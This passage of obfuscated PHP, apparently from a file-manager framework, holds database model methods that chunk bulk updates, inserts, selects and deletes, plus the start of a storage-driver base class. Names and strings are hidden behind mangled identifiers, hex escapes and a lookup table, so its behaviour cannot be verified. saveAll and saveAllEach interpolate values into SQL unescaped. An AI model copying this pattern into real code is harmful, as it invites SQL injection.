($ä‰Ğ‰[$ ¡Ù™Ú] === $‚¤¦ë®¥[12]) { unset($ä‰Ğ‰[$ ¡Ù™Ú]); } break; case $‚¤¦ë®¥[324]: $ä‰Ğ‰[$ ¡Ù™Ú] = $„ç²âË[1]; default: break; } } if ($êß­Œƒª == $‚¤¦ë®¥[355]) { $¶¢‚Ç’Ö = strtolower($this->db->getDbType()); if (strpos($¶¢‚Ç’Ö, $‚¤¦ë®¥[13]) !== 0) { return; } $ Ä¹«šâ = $this->field(!0)->fields; $ÑğƒÆ = $ Ä¹«šâ[$‚¤¦ë®¥[252]]; if (isset($ Ä¹«šâ[$‚¤¦ë®¥[251]])) { unset($ÑğƒÆ[$ Ä¹«šâ[$‚¤¦ë®¥[251]]]); } foreach ($ÑğƒÆ as $¸êØ»à‘ => $êß­Œƒª) { if (!isset($ä‰Ğ‰[$¸êØ»à‘])) { $ä‰Ğ‰[$¸êØ»à‘] = $‚¤¦ë®¥[12]; } } } } private function dataAfterFilter(&$Â³™ùÓ¤) { $¤»»´‰Ü =& $_SERVER[Ã¶¡¶„æ]; foreach ($this->dataAuto as $¼š¨ííÅ) { $”˜éù™” = $¼š¨ííÅ[0]; if (!isset($Â³™ùÓ¤[$”˜éù™”])) { continue; } if (!in_array($¤»»´‰Ü[357], explode($¤»»´‰Ü[50], $¼š¨ííÅ[2]))) { continue; } switch (trim($¼š¨ííÅ[3])) { case $¤»»´‰Ü[321]: case $¤»»´‰Ü[322]: $âñÔÆ‚ = isset($¼š¨ííÅ[4]) ? (array) $¼š¨ííÅ[4] : array(); array_unshift($âñÔÆ‚, $Â³™ùÓ¤[$”˜éù™”]); if (isset($¼š¨ííÅ[4]) && $¼š¨ííÅ[4] == $¤»»´‰Ü[377]) { $âñÔÆ‚ = array($Â³™ùÓ¤[$”˜éù™”]); } if ($¤»»´‰Ü[321] == $¼š¨ííÅ[3]) { $Â³™ùÓ¤[$”˜éù™”] = call_user_func_array($¼š¨ííÅ[1], $âñÔÆ‚); } else { $Â³™ùÓ¤[$”˜éù™”] = call_user_func_array(array(&$this, $¼š¨ííÅ[1]), $âñÔÆ‚); } break; case $¤»»´‰Ü[270]: if (isset($Â³™ùÓ¤[$”˜éù™”]) && $Â³™ùÓ¤[$”˜éù™”]) { $Â³™ùÓ¤[$”˜éù™”] = call_user_func_array(array(&$this, $¼š¨ííÅ[1]), array($Â³™ùÓ¤[$”˜éù™”])); } break; case $¤»»´‰Ü[273]: $Â³™ùÓ¤[$”˜éù™”] = $Â³™ùÓ¤[$¼š¨ííÅ[1]]; break; case $¤»»´‰Ü[294]: $íë®”ÚÒ = $Â³™ùÓ¤[$”˜éù™”]; $Â³™ùÓ¤[$”˜éù™”] = json_decode($íë®”ÚÒ, !0); if (is_null($Â³™ùÓ¤[$”˜éù™”])) { $Â³™ùÓ¤[$”˜éù™”] = $íë®”ÚÒ; } break; case $¤»»´‰Ü[323]: if ($Â³™ùÓ¤[$”˜éù™”] === $¤»»´‰Ü[12]) { unset($Â³™ùÓ¤[$”˜éù™”]); } break; case $¤»»´‰Ü[324]: $Â³™ùÓ¤[$”˜éù™”] = $¼š¨ííÅ[1]; break; default: break; } } } public function saveAll($Û›İŒ¾ú) { $¬›øø¤ =& $_SERVER[Ã¶¡¶„æ]; $Ê™ó¾¨• = $this->tablePrefix . $this->tableName; $º“ƒ•¼õ = self::SQL_WHERE_IN_CHUNK; $Û›İŒ¾ú = is_array($Û›İŒ¾ú) ? $Û›İŒ¾ú : array(); $¾ÙÆø‹— = $¬›øø¤[378]; $°‘Å­ü§ = 0; $óÎØŠˆ• = array(); $şûÀŠ÷” = count($Û›İŒ¾ú); for ($Œ±û½îé = 0; $Œ±û½îé < $şûÀŠ÷”; $Œ±û½îé++) { $­´¶¸ÙØ = $Û›İŒ¾ú[$Œ±û½îé]; if (!is_array($­´¶¸ÙØ) || count($­´¶¸ÙØ) != 4) { continue; } $á’Êç­ = "\x55\x50\104\101\x54\x45\40\140{$Ê™ó¾¨•}\140\x20\123\105\x54\x20{$­´¶¸ÙØ[2]}\x20\75\40\x43\x41\x53\x45\x20{$­´¶¸ÙØ[0]}\x20\12"; if ($°‘Å­ü§ == 0) { $¾ÙÆø‹— = $á’Êç­; } $óÎØŠˆ•[] = $¬›øø¤[118] . $­´¶¸ÙØ[1] . $¬›øø¤[118]; $°‘Å­ü§++; $¾ÙÆø‹— .= "\40\x57\110\105\x4e\40\x27{$­´¶¸ÙØ[1]}\x27\40\124\x48\105\x4e\x20\47{$­´¶¸ÙØ[3]}\x27\40\12"; if ($°‘Å­ü§ == $º“ƒ•¼õ || $Œ±û½îé == $şûÀŠ÷” - 1) { $…À³Ëœ = implode($¬›øø¤[50], $óÎØŠˆ•); $¾ÙÆø‹— .= "\x20\x45\x4e\104\40\x20\127\x48\x45\x52\x45\40{$­´¶¸ÙØ[0]}\40\x49\x4e\40\x28{$…À³Ëœ}\x29\40"; $this->execute($¾ÙÆø‹—); $°‘Å­ü§ = 0; $¾ÙÆø‹— = $á’Êç­; $this->chunkEventCheck(count($óÎØŠˆ•)); $óÎØŠˆ• = array(); } } $this->chunkEventSet(); } public function saveAllEach($ôèíı”Á) { $Æ©¥Ô¼ë =& $_SERVER[Ã¶¡¶„æ]; $Ò±Œ¢·Ë = $this->tablePrefix . $this->tableName; foreach ($ôèíı”Á as $Ï´ñÏÛŠ) { if (!is_array($Ï´ñÏÛŠ) || count($Ï´ñÏÛŠ) != 4) { continue; } $ì·š¡¹‰ = $Ï´ñÏÛŠ[0] . $Æ©¥Ô¼ë[379] . $Ï´ñÏÛŠ[1] . $Æ©¥Ô¼ë[118]; $Ÿ¦Èûã = $Ï´ñÏÛŠ[2] . $Æ©¥Ô¼ë[379] . $Ï´ñÏÛŠ[3] . $Æ©¥Ô¼ë[118]; $¥¡º¡–¶ = "\165\x70\x64\141\164\x65\40{$Ò±Œ¢·Ë}\40\163\145\x74\x20{$Ÿ¦Èûã}\x20\167\x68\x65\x72\x65\x20{$ì·š¡¹‰}\x3b"; $this->execute($¥¡º¡–¶); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Û£æšâ‘ = false, $À™‰Şş = false) { $this->_chunkEvent = $Û£æšâ‘; $this->_chunkEventParam = $À™‰Şş; } private function chunkEventCheck($ç©ëĞ£) { if (!$this->_chunkEvent) { return; } $Äìø¹ÒÏ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Äìø¹ÒÏ[$_SERVER[Ã¶¡¶„æ][380]] = $ç©ëĞ£; Hook::trigger($this->_chunkEvent, $Äìø¹ÒÏ); } public function addAll($­üËì¬, $ë·ûÂíı = array(), $“ò´¡©ä = false) { $²Îí©Ïµ =& $_SERVER[Ã¶¡¶„æ]; ignore_timeout(); $êçÁÁ° = self::SQL_WHERE_IN_CHUNK; if (empty($­üËì¬)) { $this->error = think_lang($²Îí©Ïµ[271]); return !1; } $ë·ûÂíı = $this->_parseOptions($ë·ûÂíı); foreach ($­üËì¬ as $«ÉÉŒùµ => $‰˜åÏÓ†) { $­üËì¬[$«ÉÉŒùµ] = $this->_facade($‰˜åÏÓ†); $this->_beforeInsert($­üËì¬[$«ÉÉŒùµ], $ë·ûÂíı); } if (method_exists($this->db, $²Îí©Ïµ[272])) { for ($õÛ†ÊÆ = 0; $õÛ†ÊÆ < count($­üËì¬); $õÛ†ÊÆ += $êçÁÁ°) { $Üä‚çş° = array_slice($­üËì¬, $õÛ†ÊÆ, $êçÁÁ°); if (!is_array($Üä‚çş°) || count($Üä‚çş°) == 0) { break; } $µ¹ØÑ÷€ = $this->db->insertAll($Üä‚çş°, $ë·ûÂíı, $“ò´¡©ä); $this->chunkEventCheck(count($Üä‚çş°)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($­üËì¬ as $«ÉÉŒùµ => $‰˜åÏÓ†) { $µ¹ØÑ÷€ = $this->db->insert($‰˜åÏÓ†, $ë·ûÂíı, $“ò´¡©ä); } $this->commit(); } if (!1 !== $µ¹ØÑ÷€) { $ö¼ùú®® = $this->getLastInsID(); if ($ö¼ùú®®) { return $ö¼ùú®®; } } return $µ¹ØÑ÷€; } public function save($úÛåòÕ = '', $ùÉŠêƒë = array()) { $ÎŸİ£ö =& $_SERVER[Ã¶¡¶„æ]; $áƒ´ÓÎ = self::SQL_WHERE_IN_CHUNK; $İùæÎÎ® = $this->optionsValue(); $•ã¸µÛÄ = $this->findWhereField($İùæÎÎ®); if (!$•ã¸µÛÄ) { return parent::save($úÛåòÕ, $ùÉŠêƒë); } $ä¬±œÍÕ = 0; $­†¥÷µœ = $İùæÎÎ®[$ÎŸİ£ö[275]][$•ã¸µÛÄ][1]; $­†¥÷µœ = is_array($­†¥÷µœ) ? $­†¥÷µœ : array(); $ÖÀĞçóé = count($­†¥÷µœ); for ($ˆû¸‘ÏÛ = 0; $ˆû¸‘ÏÛ < $ÖÀĞçóé; $ˆû¸‘ÏÛ += $áƒ´ÓÎ) { $°Ø®› = array_slice($­†¥÷µœ, $ˆû¸‘ÏÛ, $áƒ´ÓÎ); if (!is_array($°Ø®›) || count($°Ø®›) == 0) { break; } $İùæÎÎ®[$ÎŸİ£ö[275]][$•ã¸µÛÄ][1] = $°Ø®›; $this->optionsValue($İùæÎÎ®); $ä¬±œÍÕ += parent::save($úÛåòÕ, $ùÉŠêƒë); $this->chunkEventCheck(count($°Ø®›)); } $this->chunkEventSet(); return $ä¬±œÍÕ; } public function add($ú¥øíê¢ = '', $ã¿‡Ş¯ = array(), $„¢åÎÚ = false) { if ($this->addTaskStatus && is_array($ú¥øíê¢)) { $this->addTaskData[] = $ú¥øíê¢; return; } return parent::add($ú¥øíê¢, $ã¿‡Ş¯, $„¢åÎÚ); } public function parseWhereLike($Ì¯¸Áİš, $®‰ÑœÂ = '', $ê’Ÿ–éı = false, &$Ìêä©Ò = false) { $úã­Ú¼Í =& $_SERVER[Ã¶¡¶„æ]; $ğéá‚²¶ = $GLOBALS[$úã­Ú¼Í[6]][$úã­Ú¼Í[381]]; if (!$ğéá‚²¶[$úã­Ú¼Í[382]]) { return $Ì¯¸Áİš; } if (!is_array($Ì¯¸Áİš)) { return $Ì¯¸Áİš; } $©Úøüè = array(); $›ä´ê¾ä = 0; foreach ($Ì¯¸Áİš as $è™ÀùÖË => $·İ‚è™) { if (is_array($·İ‚è™) && count($·İ‚è™) == 2 && $·İ‚è™[0] == $úã­Ú¼Í[383] && is_string($·İ‚è™[1]) && substr($·İ‚è™[1], 0, 1) == $úã­Ú¼Í[384] && substr($·İ‚è™[1], strlen($·İ‚è™[1]) - 1, 1) == $úã­Ú¼Í[384]) { $Ìêä©Ò = !0; $Ê¶ùÔÊ¡ = is_string($è™ÀùÖË) ? $è™ÀùÖË : $®‰ÑœÂ; $òçøñ‹Š = substr($·İ‚è™[1], 1, strlen($·İ‚è™[1]) - 2); $òçøñ‹Š = $this->db->escapeString($òçøñ‹Š); if (!strpos($Ê¶ùÔÊ¡, $úã­Ú¼Í[10])) { $Ê¶ùÔÊ¡ = $úã­Ú¼Í[385] . $Ê¶ùÔÊ¡ . $úã­Ú¼Í[385]; } $«Õ„Úè´ = $úã­Ú¼Í[188] . $òçøñ‹Š . $úã­Ú¼Í[188]; $òçøñ‹Š = str_replace(array($úã­Ú¼Í[10], $úã­Ú¼Í[386], $úã­Ú¼Í[11]), $úã­Ú¼Í[387], $òçøñ‹Š); if ($ğéá‚²¶[$úã­Ú¼Í[388]]) { $«Õ„Úè´ = $úã­Ú¼Í[389] . $òçøñ‹Š . $úã­Ú¼Í[390]; if ($ğéá‚²¶[$úã­Ú¼Í[391]]) { $«Õ„Úè´ = $úã­Ú¼Í[390] . $òçøñ‹Š . $úã­Ú¼Í[389]; } } $©Úøüè[$›ä´ê¾ä] = $úã­Ú¼Í[392] . $Ê¶ùÔÊ¡ . $úã­Ú¼Í[393] . $«Õ„Úè´ . $úã­Ú¼Í[394]; $›ä´ê¾ä++; continue; } if (is_array($·İ‚è™)) { $®‰ÑœÂ = is_string($è™ÀùÖË) ? $è™ÀùÖË : $®‰ÑœÂ; $·İ‚è™ = $this->parseWhereLike($·İ‚è™, $®‰ÑœÂ, !0, $Ìêä©Ò); } if (is_numeric($è™ÀùÖË)) { $©Úøüè[$›ä´ê¾ä] = $·İ‚è™; $›ä´ê¾ä++; } else { $©Úøüè[$è™ÀùÖË] = $·İ‚è™; } } if ($Ìêä©Ò && !$ê’Ÿ–éı) { } return $©Úøüè; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($êèˆÅí­ = array()) { $’¬Ã— “ =& $_SERVER[Ã¶¡¶„æ]; $Ô©Øëªæ = self::SQL_WHERE_IN_CHUNK; $ÜĞå†á = $this->optionsValue(); $¬±í€ƒ = $this->findWhereField($ÜĞå†á); if (!$¬±í€ƒ || isset($ÜĞå†á[$’¬Ã— “[292]]) || isset($ÜĞå†á[$’¬Ã— “[353]])) { return parent::select($êèˆÅí­); } $‡¼­ËÜí = $ÜĞå†á[$’¬Ã— “[275]][$¬±í€ƒ][1]; $‡¼­ËÜí = is_array($‡¼­ËÜí) ? $‡¼­ËÜí : array(); $¢‚×Å = null; for ($ªäüºÛÎ = 0; $ªäüºÛÎ < count($‡¼­ËÜí); $ªäüºÛÎ += $Ô©Øëªæ) { $Ã«²™›” = array_slice($‡¼­ËÜí, $ªäüºÛÎ, $Ô©Øëªæ); if (!is_array($Ã«²™›”) || count($Ã«²™›”) == 0) { break; } $ÜĞå†á[$’¬Ã— “[275]][$¬±í€ƒ][1] = $Ã«²™›”; $this->optionsValue($ÜĞå†á); $Ç Œİ¾› = parent::select($êèˆÅí­); if (!$Ç Œİ¾›) { continue; } $¢‚×Å = is_array($¢‚×Å) ? $¢‚×Å : array(); $¢‚×Å = array_merge($¢‚×Å, $Ç Œİ¾›); } return $¢‚×Å; } public function delete($ó«ŞŠıÆ = array()) { $÷¬Ì¨Ñ =& $_SERVER[Ã¶¡¶„æ]; $ÃÓƒî¬Õ = self::SQL_WHERE_IN_CHUNK; $µå¢èû = $this->optionsValue(); $Ó£éìµÏ = $this->findWhereField($µå¢èû); if (!$Ó£éìµÏ) { return parent::delete($ó«ŞŠıÆ); } $ÓÁè¥ıá = 0; $èíÂ‘É¦ = $µå¢èû[$÷¬Ì¨Ñ[275]][$Ó£éìµÏ][1]; $èíÂ‘É¦ = is_array($èíÂ‘É¦) ? $èíÂ‘É¦ : array(); for ($çªË™ƒ = 0; $çªË™ƒ < count($èíÂ‘É¦); $çªË™ƒ += $ÃÓƒî¬Õ) { $‚”®¾Ü« = array_slice($èíÂ‘É¦, $çªË™ƒ, $ÃÓƒî¬Õ); if (!is_array($‚”®¾Ü«) || count($‚”®¾Ü«) == 0) { break; } $µå¢èû[$÷¬Ì¨Ñ[275]][$Ó£éìµÏ][1] = $‚”®¾Ü«; $this->optionsValue($µå¢èû); $ÓÁè¥ıá += parent::delete($ó«ŞŠıÆ); } return $ÓÁè¥ıá; } private function findWhereField($å›‹Šø×) { $¥«š®Æ =& $_SERVER[Ã¶¡¶„æ]; $º±¸ºÃƒ = self::SQL_WHERE_IN_CHUNK; if (!is_array($å›‹Šø×) || !is_array($å›‹Šø×[$¥«š®Æ[275]])) { return !1; } foreach ($å›‹Šø×[$¥«š®Æ[275]] as $Ê­Í£ë => $Üş´º¡î) { if (is_array($Üş´º¡î) && isset($Üş´º¡î[0]) && is_string($Üş´º¡î[0]) && strtolower($Üş´º¡î[0]) == $¥«š®Æ[7] && is_array($Üş´º¡î[1]) && count($Üş´º¡î[1]) > $º±¸ºÃƒ) { ignore_timeout(); return $Ê­Í£ë; } } return !1; } public function setMasterDB($µğ’‘ÂÀ = true) { think_config($_SERVER[Ã¶¡¶„æ][395], $µğ’‘ÂÀ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\x65\155\x4f\160\164\x69\157\156"; public $field = array(); public function listData($¤‘ñÑØì = false, $¹ààˆòË = "\155\157\x64\151\x66\171\124\x69\155\145", $è¾£Œ° = false) { $•‘å€à = Model($this->modelType)->get(!1, $this->optionType, !0); $øÉ“™öí = array_values($•‘å€à); if ($øÉ“™öí && $øÉ“™öí[0] && !is_array($øÉ“™öí[0])) { Model($this->modelType)->cacheRemove($this->optionType); $•‘å€à = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$•‘å€à) { return $¤‘ñÑØì ? null : array(); } if (!$¤‘ñÑØì) { $•‘å€à = array_filter(array_values($•‘å€à)); return array_sort_by($•‘å€à, $¹ààˆòË, $è¾£Œ°); } return $•‘å€à[$_SERVER[Ã¶¡¶„æ][396] . $¤‘ñÑØì]; } public function insert($”Õ”Ûˆª) { $®å¯õş =& $_SERVER[Ã¶¡¶„æ]; $”Õ”Ûˆª = array_field_key($”Õ”Ûˆª, $this->field); $ÇºšĞ†Ú = Model($this->modelType)->get($®å¯õş[397], $this->optionType . $®å¯õş[398]); $ÇºšĞ†Ú = $ÇºšĞ†Ú ? $ÇºšĞ†Ú : 0; $”Õ”Ûˆª[$®å¯õş[399]] = ++$ÇºšĞ†Ú; $”Õ”Ûˆª[$®å¯õş[200]] = time(); $”Õ”Ûˆª[$®å¯õş[85]] = time(); Model($this->modelType)->set($®å¯õş[397], $ÇºšĞ†Ú, $this->optionType . $®å¯õş[398]); Model($this->modelType)->set($®å¯õş[396] . $ÇºšĞ†Ú, $”Õ”Ûˆª, $this->optionType); return $ÇºšĞ†Ú; } public function update($•ßÆ†¤¼, $¸ŞÒÊ) { $ªúşø–æ =& $_SERVER[Ã¶¡¶„æ]; $¸ŞÒÊ = array_field_key($¸ŞÒÊ, $this->field); $ôƒ ã…‰ = $this->listData($•ßÆ†¤¼); if (!$ôƒ ã…‰ || !$•ßÆ†¤¼) { return !1; } $¸ŞÒÊ = array_merge($ôƒ ã…‰, $¸ŞÒÊ); $¸ŞÒÊ[$ªúşø–æ[85]] = time(); return Model($this->modelType)->set($ªúşø–æ[396] . $•ßÆ†¤¼, $¸ŞÒÊ, $this->optionType); } public function remove($â£“«óú) { if (!$â£“«óú) { return !1; } return Model($this->modelType)->remove($_SERVER[Ã¶¡¶„æ][396] . $â£“«óú, $this->optionType); } public function clear() { $›ƒâÑ¸Ú =& $_SERVER[Ã¶¡¶„æ]; Model($this->modelType)->remove($›ƒâÑ¸Ú[397], $this->optionType . $›ƒâÑ¸Ú[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($áÄë»›, $ãÑéı·õ) { if (!$ãÑéı·õ) { return !1; } $Úú±Şâ¢ = $this->listData(); $Úú±Şâ¢ = array_to_keyvalue($Úú±Şâ¢, $áÄë»›); return isset($Úú±Şâ¢[$ãÑéı·õ]) ? $Úú±Şâ¢[$ãÑéı·õ] : !1; } public function findByName($• ¿Ùƒ) { return $this->findByKey($_SERVER[Ã¶¡¶„æ][32], $• ¿Ùƒ); } protected function resetData($§¤…¯Ò) { $ÀŸĞ÷£ =& $_SERVER[Ã¶¡¶„æ]; $§¤…¯Ò = is_array($§¤…¯Ò) ? $§¤…¯Ò : array(); $ºƒŒóÍ¨ = array(); for ($âê¬º·ğ = 0; $âê¬º·ğ < count($§¤…¯Ò); $âê¬º·ğ++) { $ºƒŒóÍ¨[$ÀŸĞ÷£[396] . $§¤…¯Ò[$âê¬º·ğ][$ÀŸĞ÷£[399]]] = $§¤…¯Ò[$âê¬º·ğ]; } return Model($this->modelType)->set($ºƒŒóÍ¨, !1, $this->optionType); } private function getAutoName($®™õŸ®¿) { $˜‹®›™Ş = array_to_keyvalue($this->listData(), $_SERVER[Ã¶¡¶„æ][32]); if (!$˜‹®›™Ş || !isset($˜‹®›™Ş[$®™õŸ®¿])) { return $®™õŸ®¿; } for ($áØÍ—ÁÂ = 1; $áØÍ—ÁÂ < count($˜‹®›™Ş); $áØÍ—ÁÂ++) { $ÌÙë®æğ = $®™õŸ®¿ . "\x28{$áØÍ—ÁÂ}\x29"; if (!isset($˜‹®›™Ş[$ÌÙë®æğ])) { return $ÌÙë®æğ; } } return $ÌÙë®æğ; } } goto e…Îì«£¨Ê; fË‡–Œê²¡: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¥æÚàÌ© =& $_SERVER[Ã¶¡¶„æ]; $this->objectDriver = array($¥æÚàÌ©[60], $¥æÚàÌ©[61], $¥æÚàÌ©[62], $¥æÚàÌ©[63], $¥æÚàÌ©[64], $¥æÚàÌ©[65], $¥æÚàÌ©[66], $¥æÚàÌ©[67], $¥æÚàÌ©[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ò¥±·Öİ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ò¥±·Öİ, $_SERVER[Ã¶¡¶„æ][8]); } return $Ò¥±·Öİ; } public function iconvApp($áÚëÌ¿) { return $áÚëÌ¿; } public function iconvSystem($ßˆ‚È¶) { return $ßˆ‚È¶; } public function iconvTo($«×ç³ÁŸ, $ÚªØ‚, $ĞèÜ•°Å) { $Ä›Õ”ç =& $_SERVER[Ã¶¡¶„æ]; if (!$«×ç³ÁŸ || !function_exists($Ä›Õ”ç[69])) { return $«×ç³ÁŸ; } static $Ç¡î‚şÂ = array(); $±ƒˆ‡¡Í = $ÚªØ‚ . $Ä›Õ”ç[70] . $ĞèÜ•°Å . $Ä›Õ”ç[71] . $«×ç³ÁŸ; if (isset($Ç¡î‚şÂ[$±ƒˆ‡¡Í])) { return $Ç¡î‚şÂ[$±ƒˆ‡¡Í]; } if (function_exists($Ä›Õ”ç[72])) { $¶Ç™¦†— = @mb_convert_encoding($«×ç³ÁŸ, $ĞèÜ•°Å, $ÚªØ‚); } else { $¶Ç™¦†— = @iconv($ÚªØ‚, $ĞèÜ•°Å, $«×ç³ÁŸ); } $¶Ç™¦†— = $¶Ç™¦†— ? $¶Ç™¦†— : $«×ç³ÁŸ; if (strstr($¶Ç™¦†—, $Ä›Õ”ç[73])) { $¶Ç™¦†— = str_replace($Ä›Õ”ç[73], $Ä›Õ”ç[11], $¶Ç™¦†—); } $Ç¡î‚şÂ[$ÚªØ‚ . $Ä›Õ”ç[70] . $ĞèÜ•°Å . $Ä›Õ”ç[71] . $«×ç³ÁŸ] = $¶Ç™¦†—; $Ç¡î‚şÂ[$ĞèÜ•°Å . $Ä›Õ”ç[70] . $ÚªØ‚ . $Ä›Õ”ç[71] . $«×ç³ÁŸ] = $«×ç³ÁŸ; $Ç¡î‚şÂ[$ĞèÜ•°Å . $Ä›Õ”ç[70] . $ÚªØ‚ . $Ä›Õ”ç[71] . $¶Ç™¦†—] = $«×ç³ÁŸ; $Ç¡î‚şÂ[$ÚªØ‚ . $Ä›Õ”ç[70] . $ĞèÜ•°Å . $Ä›Õ”ç[71] . $¶Ç™¦†—] = $¶Ç™¦†—; return $¶Ç™¦†—; } public function getPathInner($Ù§¥ŸÜ) { $Ê´ß‰  = IO::init($Ù§¥ŸÜ); return $Ê´ß‰ ->path; } public function getPathOuter($Î×¨‚Œ) { $ıûõŸñé =& $_SERVER[Ã¶¡¶„æ]; $ò”¹—×­ = strlen(trim($this->pathBase, $ıûõŸñé[8])); $Î×¨‚Œ = substr(trim($Î×¨‚Œ, $ıûõŸñé[8]), $ò”¹—×­); return $this->pathDriver . $ıûõŸñé[8] . ltrim($Î×¨‚Œ, $ıûõŸñé[8]); } public function isParentOf($†”¢÷¢ó, $Í»ÍêÇ) { $ÅÊ¤ÇÃ¡ =& $_SERVER[Ã¶¡¶„æ]; $†”¢÷¢ó = rtrim(strtolower($†”¢÷¢ó), $ÅÊ¤ÇÃ¡[8]) . $ÅÊ¤ÇÃ¡[8]; $Í»ÍêÇ = rtrim(strtolower($Í»ÍêÇ), $ÅÊ¤ÇÃ¡[8]) . $ÅÊ¤ÇÃ¡[8]; $â’õ„™‡ = strpos($Í»ÍêÇ, $†”¢÷¢ó) === 0; return $â’õ„™‡; } public function getType() { $ô®Ê×Ôİ =& $_SERVER[Ã¶¡¶„æ]; $Õ‘óœ¾ = str_replace($ô®Ê×Ôİ[74], $ô®Ê×Ôİ[12], get_class($this)); return strtolower($Õ‘óœ¾); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ŒÂ›¬å’, $ßÇÛì®) { $Š¬¦ş‡Ì =& $_SERVER[Ã¶¡¶„æ]; $ĞÈÜ“ñ« = rtrim($ŒÂ›¬å’, $Š¬¦ş‡Ì[8]) . $Š¬¦ş‡Ì[8] . $ßÇÛì®; $ıß©çš¨ = $this->exist($ĞÈÜ“ñ«); return $ıß©çš¨ ? $ĞÈÜ“ñ« : !1; } public function setModifyTime($±À÷­‡è, $ìäÎ·°á = '') { } public function renameObject($×Ç±¡§Ø, $¬É İš›) { $›²Ñö  = $¬É İš›; $×Ç±¡§Ø = $this->getPathOuter($×Ç±¡§Ø); $¬É İš› = $this->pathFather($×Ç±¡§Ø) . $¬É İš›; $­µ÷È¤¹ = IO::copy($×Ç±¡§Ø, $this->pathFather($×Ç±¡§Ø), REPEAT_RENAME_FOLDER, $›²Ñö ); if ($­µ÷È¤¹) { IO::remove($×Ç±¡§Ø); } return $­µ÷È¤¹ ? $¬É İš› : !1; } public function tempFile($ ‰ıî®Å = '', $Ú¢âéÇ = '') { if (!$ ‰ıî®Å) { $ ‰ıî®Å = rand_string(15); } $¨öü—İ = TEMP_FILES . rand_string(15) . $_SERVER[Ã¶¡¶„æ][8]; @mkdir($¨öü—İ, DEFAULT_PERRMISSIONS, !0); $êıáöÂñ = $¨öü—İ . $ ‰ıî®Å; @touch($êıáöÂñ); if ($Ú¢âéÇ) { file_put_contents($êıáöÂñ, $Ú¢âéÇ); } return $êıáöÂñ; } public function tempFileRemve($æ„¯ûƒ—) { @unlink($æ„¯ûƒ—); @rmdir($this->pathFather($æ„¯ûƒ—)); } public function mkfile($Æ‹¾‡µÒ, $Ó¡ªöÄ = '', $ Åšê = REPEAT_RENAME) { } public function mkdir($¢¶¼Îè, $÷¢©†Å = REPEAT_SKIP) { } public function delFile($ª†’Œ€) { } public function delFolder($½ÃÎºõÎ) { } public function copyFile($ˆæéçÈ‰, $ÎÀÔ³¯¾) { } public function moveFile($¥ö˜ø¤¿, $£îŠæ…ã) { } public function remove($‰ÆÃŸô) { if ($this->isFile($‰ÆÃŸô)) { return $this->delFile($‰ÆÃŸô); } return $this->delFolder($‰ÆÃŸô); } public function rename($Ê§š², $ìÏï±ğÉ) { } public function exist($”ÕµÒ´Ó) { } public function findByHash($¬¬«ÜõŒ = '', $„½‚¦êÑ = '') { return !1; } public function isFile($…şü­İŒ) { } public function isFolder($£ùöÜ¯à) { } public function size($‘ÏÃ†) { } public function info($¾˜ªáú) { } public function infoSimple($Ë§¸ØÂò) { return $this->info($Ë§¸ØÂò); } public function infoAuth($˜´øˆÓÜ) { return $this->info($˜´øˆÓÜ); } public function infoFull($¨üı¤¦â) { return $this->info($¨üı¤¦â); } public function infoWithChildren($úÆ‹å¬ê) { $ıäˆ•ûŒ =& $_SERVER[Ã¶¡¶„æ]; static $…¸˜ˆœù = array(); if (isset($…¸˜ˆœù[$úÆ‹å¬ê])) { return $…¸˜ˆœù[$úÆ‹å¬ê]; } $ĞîşÍ«Î = $this->info($úÆ‹å¬ê); if ($ĞîşÍ«Î && $ĞîşÍ«Î[$ıäˆ•ûŒ[33]] == $ıäˆ•ûŒ[75]) { $ğ•Ş«ú® = array($ıäˆ•ûŒ[76] => 0, $ıäˆ•ûŒ[77] => 0, $ıäˆ•ûŒ[78] => 0); $this->infoChildren($úÆ‹å¬ê, $ğ•Ş«ú®); $ĞîşÍ«Î[$ıäˆ•ûŒ[76]] = $ğ•Ş«ú®[$ıäˆ•ûŒ[76]]; $ĞîşÍ«Î[$ıäˆ•ûŒ[79]] = array($ıäˆ•ûŒ[80] => $ğ•Ş«ú®[$ıäˆ•ûŒ[77]], $ıäˆ•ûŒ[81] => $ğ•Ş«ú®[$ıäˆ•ûŒ[78]]); $…¸˜ˆœù[$úÆ‹å¬ê] = $ĞîşÍ«Î; } return $ĞîşÍ«Î; } public function listPath($şƒÆà¦Ş, $ç›…ºò÷ = false) { } public function has($Š±êËîå, $ùèšÈë‰ = false, $îµäñà¤ = false) { } public function canRead($©´¨Ñ“) { } public function canWrite($İ¶³Ò¼­) { } public function getContent($»ÖŠÊ¬è) { } public function setContent($èğÆÖëë, $Œıİ˜Õï = '') { } protected function infoChildren($ô”’Ñ¨…, &$¹ó¡“÷Ê) { $şÍ÷Ğµ‚ =& $_SERVER[Ã¶¡¶„æ]; check_abort_echo(); $Ñ„Ì‹´ = $this->listPath($ô”’Ñ¨…, !0); $Ñ„Ì‹´ = array_merge($Ñ„Ì‹´[$şÍ÷Ğµ‚[82]], $Ñ„Ì‹´[$şÍ÷Ğµ‚[83]]); foreach ($Ñ„Ì‹´ as $§–Ëî¹Ù) { if ($§–Ëî¹Ù[$şÍ÷Ğµ‚[33]] == $şÍ÷Ğµ‚[75]) { $¹ó¡“÷Ê[$şÍ÷Ğµ‚[78]]++; $ ÏÅéÉ = $this->getPathInner($§–Ëî¹Ù[$şÍ÷Ğµ‚[84]]); $this->infoChildren($ ÏÅéÉ, $¹ó¡“÷Ê); } else { $¹ó¡“÷Ê[$şÍ÷Ğµ‚[77]]++; $¹ó¡“÷Ê[$şÍ÷Ğµ‚[76]] += 